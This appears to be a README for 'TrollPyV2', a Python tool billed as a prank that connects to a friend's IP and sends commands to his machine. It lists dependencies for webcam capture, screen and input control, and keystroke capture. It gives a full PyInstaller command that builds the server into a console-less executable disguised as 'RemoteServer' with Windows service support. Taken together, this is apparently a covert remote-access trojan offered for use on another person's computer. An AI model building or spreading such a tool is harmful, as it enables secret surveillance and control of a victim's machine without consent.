# TrollPyV2
Magic instrument for troll u friend with python

client.py - We connect to a friend's IP and a list of commands is displayed that we can use to troll him.

1. Install dependencies (one-time)
pip install pyinstaller pywin32 opencv-python numpy pyautogui pynput psutil keyboard
2. Build the EXE (copy and paste the entire file)
Open a cmd prompt as administrator in the folder with server.py and run:

bash
pyinstaller --onefile --noconsole --name RemoteServer ^
--hidden-import=win32serviceutil ^
--hidden-import=win32service ^
--hidden-import=win32event ^
--hidden-import=servicemanager ^
--hidden-import=ctypes ^
--hidden-import=subprocess ^
--hidden-import=tkinter ^
server.py

